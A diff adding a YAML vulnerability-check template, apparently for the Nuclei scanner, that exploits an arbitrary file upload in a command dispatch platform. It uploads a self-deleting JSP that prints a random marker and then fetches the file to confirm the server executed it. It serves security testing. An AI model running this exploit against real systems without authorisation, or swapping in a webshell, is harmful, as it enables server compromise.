@@ -1,0 +1,55 @@
+id: poc-yaml-command-dispatch-platform-upload-anyfile-upload
+info:
+  name: 可视化融合指挥调度平台 upload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 任意上传
+  metadata:
+    finger: 可视化融合指挥调度平台
+
+variables:
+  t1: '{{rand_text_alpha(4)}}'
+  t2: '{{base64(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/dm/dispatch/user/upload'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
+    body: |-
+      ------WebKitFormBoundary7ctER307B0RaQwOp
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundary7ctER307B0RaQwOp--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        regex:
+          - '/media/medias/(.*?).jsp'
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - '{{BaseURL}}/media/medias/{{path}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
+      - type: status
+        status:
+          - 200
